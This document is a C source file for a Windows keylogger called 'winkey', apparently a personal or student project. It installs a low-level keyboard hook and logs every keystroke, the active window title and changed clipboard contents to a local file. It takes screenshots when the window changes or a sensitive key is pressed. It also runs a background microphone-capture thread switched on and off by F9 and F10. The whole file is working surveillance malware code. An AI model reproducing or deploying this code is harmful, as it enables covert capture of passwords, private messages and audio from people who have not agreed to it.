#include "winkey.h"

HHOOK g_ouk;
static char last_clip[1024] = {0};

volatile int g_micro_run = 0;

DWORD WINAPI thread_micro(LPVOID lp)
{
	(void)lp;
	while(1)
	{
		if (g_micro_run)
		{
			capture_micro();
		}
		Sleep(100);
	}
	return 0;
}


DWORD which_open(char *exe)
{
	HWND hwnd = GetForegroundWindow();
	DWORD pid = 0;

	if (!hwnd)
		return 0;
	GetWindowThreadProcessId(hwnd, &pid);
	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
	if (!hProc)
		return 0;
	if (!GetModuleFileNameExA(hProc, NULL, exe, MAX_PATH))
	{
		CloseHandle(hProc);
		return 0;
	}
	CloseHandle(hProc);
	return pid;
}


LRESULT CALLBACK callback_clavier(int ncode, WPARAM wp, LPARAM lp)
{
	static HWND last_window = NULL;


	char exe[MAX_PATH] = {0};
	char key[8] = {0};
	char time[64];
	char title[256] = {0};
	char clip[1024];
	if (ncode == HC_ACTION && wp == WM_KEYDOWN)
	{
		KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lp;
		HWND current = GetForegroundWindow();
		if (current && current != last_window)
		{
			printf("CAPTURE TRY\n");
			capture_screen(L"C:\\Users\\marcc\\keylogger-Wind\\winkey\\screens\\window_change.bmp");
			last_window = current;
		}
		if (is_sensitive_key(kbd->vkCode))
			capture_screen(L"C:\\Users\\marcc\\keylogger-Wind\\winkey\\screens\\sensitive_key.bmp");
		if (kbd->vkCode == VK_F9)
		{
			printf("MICRO ACTIVE CHEF !\n:");
			g_micro_run = 1;
		}
		if (kbd->vkCode == VK_F10)
		{
			printf("MICRO DESCATIVER CHEF!\n");
			g_micro_run = 0 ;
		}
		DWORD pid = which_open(exe);
		if (!allow_app(exe, pid))
			return (CallNextHookEx(g_ouk, ncode, wp, lp));
		read_clipboard(clip, sizeof(clip));
		get_time(time);
		get_window_title(title);
		int new_key = vk_to_char(kbd->vkCode, key);
		char *spe_touch = special_touch(kbd->vkCode);
		DWORD size = 0;
		WIN32_FILE_ATTRIBUTE_DATA fad;
		if (GetFileAttributesExA("winkey.log", GetFileExInfoStandard, &fad))
		{
			size = fad.nFileSizeLow;
		}
		if (size > 5 * 1024 * 1024)
		{
			FILE *reset = fopen("winkey.log", "w");
			fclose(reset);
		}
		FILE *f = fopen("winkey.log", "a");
		if (f)
		{
			fprintf(f, "[%s] - '%s'\n", time, title);
			if (spe_touch)
				fprintf(f, "<%s>\n", spe_touch);
			else if (new_key)
				fprintf(f, "%s\n", key);
			else
				fprintf(f, "VK(%lu)\n", kbd->vkCode);
			if (clip[0] != '\0' && strcmp(clip, last_clip) != 0)
			{
				fprintf(f,"[CLIPBOARD] %s\n", clip);
				strcpy_s(last_clip, sizeof(last_clip), clip);
			}
			fclose(f);
		}
	}
	return CallNextHookEx(g_ouk, ncode, wp, lp);
}



int run_winkey(void)
{
	g_ouk = SetWindowsHookEx(WH_KEYBOARD_LL, callback_clavier, NULL, 0);
	MSG msg;
	if (!g_ouk)
	{
		printf("Error: can't install the hook.\n");
		return 1;
	}
	printf("winkey: hook install ;)\n");
	while(GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(g_ouk);
	return 0;
}



int main(void)
{
	CreateThread(NULL, 0, thread_micro, NULL, 0, NULL);
	return (run_winkey());
}


